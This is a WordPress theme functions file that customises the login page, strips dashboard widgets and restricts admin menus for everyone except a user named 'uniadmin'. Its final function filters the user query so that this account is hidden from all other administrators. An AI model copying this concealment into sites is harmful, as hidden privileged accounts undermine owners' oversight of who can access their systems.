<?php
/**
 * Custom Login Page
 */
function sh_login_logo() {
	wp_enqueue_style( 'login-custom-style', UNI_DIR .'/assets/css/login.css' );
}
add_action( 'login_enqueue_scripts', 'sh_login_logo' );

/**
 * Remove Dashboard
**/
function disable_default_dashboard_widgets() {
	global $wp_meta_boxes;
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
	unset($wp_meta_boxes['dashboard']['side']['high']['redux_dashboard_widget']);

}
add_action('wp_dashboard_setup', 'disable_default_dashboard_widgets', 999);

/**
 * Remove Admin Bar
**/
function remove_wp_logo( $wp_admin_bar ) {
	$wp_admin_bar->remove_node('wp-logo');
	$wp_admin_bar->remove_node('comments');
}
add_action('admin_bar_menu', 'remove_wp_logo', 999);

/**
 * Hide Menu Page If User Not uniadmin
**/
function remove_menus() {
	global $current_user, $submenu;
	$username = $current_user->user_login;
	if( $username != 'uniadmin' && get_theme_mod( 'disable_restrict_capabilities' ) == '0' ) {
		remove_menu_page( 'plugins.php' );
	 	remove_menu_page( 'tools.php' );
	 	remove_menu_page( 'options-general.php' );
	 	remove_menu_page( 'edit-comments.php' );
	 	remove_menu_page( 'edit.php?post_type=acf-field-group' );
    	remove_menu_page( 'wpcf7' );
    	unset( $submenu['index.php'][10] );
	    unset( $submenu['themes.php'][5] );
	    unset( $submenu['themes.php'][20] );
	    unset( $submenu['themes.php'][22] );
	}
}
add_action( 'admin_menu', 'remove_menus', 999 );

function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ( $username != 'uniadmin' ) {
		global $wpdb;
		$user_search->query_where = str_replace( 'WHERE 1=1',
		"WHERE 1=1 AND {$wpdb->users}.user_login != 'uniadmin'",$user_search->query_where );
	}
}
add_action('pre_user_query','yoursite_pre_user_query');